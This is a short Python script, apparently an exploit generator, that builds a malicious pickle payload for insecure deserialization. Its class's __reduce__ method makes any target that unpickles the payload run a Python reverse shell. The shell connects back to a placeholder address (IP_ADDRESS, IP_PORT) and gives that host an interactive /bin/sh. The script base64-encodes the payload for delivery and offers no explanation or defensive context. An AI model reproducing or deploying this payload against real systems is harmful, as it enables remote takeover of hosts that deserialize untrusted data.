import subprocess
import pickle
import base64

# Exploit that we want the target to unpickle
class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (('python', '-c', 'import socket,subprocess	,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS", IP_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'),))

shellcode =base64.b64encode(pickle.dumps(Exploit()))
print(shellcode)
